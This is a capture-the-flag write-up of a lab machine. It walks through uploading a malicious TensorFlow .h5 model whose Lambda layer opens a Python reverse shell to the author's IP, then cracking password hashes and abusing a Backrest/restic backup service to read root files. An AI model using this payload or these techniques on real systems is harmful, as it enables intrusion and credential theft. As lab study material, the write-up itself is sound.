## Engagement Notes

This challenge was pretty simple. Read some tensorflow documentation to understand how to load an arbitrary lambda into a model, upload it to be ran by our target - then elevate permissions through a secondary backup service running on the server.

# Enumeration

### Set variables for further engagement


```python
import requests
from chepy import Chepy
from pprint import pprint

source =! ip address | grep tun | grep 10 | tr "/" " " | awk '{print $2}'
public_source = requests.get('https://ifconfig.co/ip').text
target = 'artificial.htb'

print(f"source: {source}")
print(f"target: {target}")
```

    source: ['10.10.14.31']
    target: artificial.htb


### Port scan target

We find a pretty limited footprint of just a free-to-register web portal with a helpful Dockerfile to generate payloads to upload. Very thoughtful of them!

## Foothold

![alt text](engagement_files/image.png)

Rather than worry about versioning, I just use their Dockerfile. While friends worked on this as well we realized that subtle python version differences were causing huge differences in the payload behavior. Ultimately they also ended up using Docker to solve this problem.

!wget2 http://artificial.htb/static/Dockerfile

```

This uploaded fine but did not pop a shell. Uploads recommended .h5 format so we'll have to continue with [this Lambda injection methodology I found](https://www.kb.cert.org/vuls/id/253266)


```python
!cat tensorshell.py
```

    import tensorflow as tf
    from tensorflow.keras.layers import Input, Lambda
    from tensorflow.keras.models import Model
    
    def harmless_lambda(x):
        import os,pty,socket;s=socket.socket();s.connect(("10.10.14.31",9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")
    
    inputs = Input(shape=(1,))
    outputs = Lambda(harmless_lambda)(inputs)
    model = Model(inputs, outputs)
    
    # Save the model as HDF5 with a Lambda layer
    model.save("test_lambda_layer.h5")
    print("Model with Lambda layer saved as test_lambda_layer.h5")


With the container built and the source code ready, lets put it all together:

```sh
î‚° docker run --rm -it -v $(pwd):/source artificial

During the build, I did have to have the port open here to allow the method to execute once. However, once I re-opened the port and submitted my .h5 file, we get the following shell.

Here I ran through commands pretty quickly because it kept booting me off, the model run must have a really short timeout.

To get persistence and save my sanity, I abused the fact that this had a spawnable shell and just added some public keys to the box.

I spent some time here trying to forge JWTs with the littered jwt-secrets, to no avail.

It was useful to open a port forwarded socket to the backend service I identified on 9098 to see what it was:
```sh
$ netstat -tulpn

This will make the remote server's :9898 service available from my interfaces :9898
```sh
î‚° ssh app@artificial.htb -L 9898:localhost:9898
```


```python
!curl -X POST 'localhost:9898/v1.Backrest/GetOperations' --data '{}' -H 'Content-Type: application/json'
```

    Unauthorized (No Authorization Header)


Went back for the main applications user database, there might be something useful here.

```sh
î‚° scp app@artificial.htb:/home/app/app/instance/
users.db .
users.db 
```

Throwing these into crackstation we get a couple new passwords.

```sh
sqlite> select * from user

Trying ssh for `gael` with one of the passwords (`mattp005numbertwo`) lets us in.

## Elevation

Doing some more research on the :9898 service, as this seems like an organic progression, we find the following repo:  
[backrest github](https://github.com/garethgeorge/backrest)  

Looking around the system we see this backrest_backup.tar.gz is group readable by sysadm. If we check `/etc/group` we can see that `gael` is a member of this group. Lets steal it!
```sh
gael@artificial:~$ cp /var/backups/backrest_backup.tar.gz .
gael@artificial:~$ ls
backrest_backup.tar.gz  linpeas.sh  user.txt
gael@artificial:~$ tar -xvf backrest_backup.tar.gz 
backrest/
backrest/restic
backrest/oplog.sqlite-wal
backrest/oplog.sqlite-shm
backrest/.config/
backrest/.config/backrest/
backrest/.config/backrest/config.json
backrest/oplog.sqlite.lock
backrest/backrest
backrest/tasklogs/
backrest/tasklogs/logs.sqlite-shm
backrest/tasklogs/.inprogress/
backrest/tasklogs/logs.sqlite-wal
backrest/tasklogs/logs.sqlite
backrest/oplog.sqlite
backrest/jwt-secret
backrest/processlogs/
backrest/processlogs/backrest.log
backrest/install.sh
gael@artificial:~$ cd backrest/
gael@artificial:~/backrest$ 
```
In the `.config` directory we find a user and password for this service:

```sh
/backrest/.config/backrest î‚° î‚  main î‚° cat config.json 
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

Base64 decoding it presents `$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO`

Hashcat was taking *forever* with this hash. I tried it with jtr instead and it found it immediately. It's likely the password hash type I picked out of the lineup for hashcat was incorrect. This worked well enough though.

```sh
[nix-shell:~/tmp]$ john --wordlist=/nix/store/khjvbjjz3yazpgln3qb9nykyf4ypahcm-wordlists-collection/share/wordlists/rock
you.txt backrest_root.hash

Session completed. 
```

Logging into the :9898 interface with our new password for `backrest_root:!@#$%^` we get access to create a repo and create a task.

Based on the documentation, the repo is the snapshot path references, and the task lets us pick a folder on the system that the executing user (root) can access.

So we specify the path as wherever, the task as the directory /root, and do an immediate run of the task.

Now we can run an arbitrary command that's part of the restic suite. This one let me mount the snapshot of /root into /home/gael/restore and strip all permissions letting us get to the root.txt

Pardon the iteration and typos:
```sh
mount /home/gael/restr3 --allow-other --no-default-permissions
```

With that command executed through the web portal, we can now browse to it on the system:
```sh
gael@artificial:~$ cd restre3/snapshots/latest/root/
gael@artificial:~/restre3/snapshots/latest/root$ ls
config  data  index  keys  locks  root.txt  scripts  snapshots
gael@artificial:~/restre3/snapshots/latest/root$ cat root.txt
01b3836583c05a310a3ed9dadb34bc25
```

I wasn't able to log into root, but I bet I could get clever to restore an authorized_keys to /root/.ssh/ and restore a modified /etc/ssh/sshd_config with `permit root login` if I wanted to get full access to the system. But after last week's insane challenge I think I'll leave that exercise to the reader.

Afterwards my buddy found that the hooks endpoints allowed for straight command execution on triggers, that was a much more intuitive idea that did pop a shell.
